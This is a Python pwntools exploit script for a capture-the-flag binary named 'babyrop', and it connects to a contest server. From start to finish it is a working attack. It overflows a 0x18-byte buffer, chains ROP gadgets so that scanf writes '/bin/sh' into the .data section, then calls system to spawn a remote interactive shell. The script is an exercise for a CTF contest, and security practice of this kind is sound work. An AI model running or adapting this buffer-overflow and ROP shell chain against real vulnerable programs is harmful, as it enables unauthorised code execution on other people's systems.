from pwn import *


binname = './babyrop'
context.binary = binname
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

elf = ELF(binname)
libc = elf.libc


gdbscript = '''
peda
b main
'''
# io = gdb.debug([binname], aslr=False, gdbscript=gdbscript)
# io = remote('localhost', 4088)
io = remote('problem.harekaze.com', 20001)

payload = 'A' * 0x18

addr_pop_rdi = 0x400683
addr_pop_rsi_r15 = 0x400681
addr_s = 0x4006c5
addr_data = 0x00601000 + 0x300

rop = ''
# scanf("%s", .data) <- /bin/sh
rop += p64(addr_pop_rdi)
rop += p64(addr_s)
rop += p64(addr_pop_rsi_r15)
rop += p64(addr_data)
rop += p64(0xdeadbeafdeadbeaf)
rop += p64(elf.plt['__isoc99_scanf'])

# system('bin/sh')
rop += p64(addr_pop_rdi)
rop += p64(addr_data)
rop += p64(elf.plt['system'])

payload += rop
io.recvuntil('?')
io.sendline(payload)

io.sendline('/bin/sh')


io.interactive()
